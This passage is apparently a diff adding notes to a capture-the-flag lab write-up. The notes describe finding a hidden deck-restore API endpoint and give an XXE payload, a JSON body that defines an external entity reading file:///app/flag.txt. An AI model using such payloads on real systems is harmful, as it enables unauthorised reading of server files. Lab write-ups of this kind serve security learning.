@@ -33,4 +33,22 @@ Hint: Can you restore the deck
 - [/static/js/main.9f7a4f9f.js](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/static/js/main.9f7a4f9f.js)
 - [/static/css/main.88b44aa2.css](https://lab-1784560347187-wgeu4b.labs-app.bugforge.io/static/css/main.88b44aa2.css)
 
+### Initial discovery
+- found an endpoint of /api/decks/:id/restore which was hidden
+- when explored 
+-
+```<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE backup [
+  
+]>
+<backup>
+```
+- the doctype backup seems suspicious.
+- while restoring i found the decks content are not restored
 
+
+### Exploit payload
+``` 
+{"name":"&xxe;","description":"pwn","category":"pwn","dtd":"<!ENTITY xxe SYSTEM \"file:///app/flag.txt\">"}
+```
+- with content type application/json
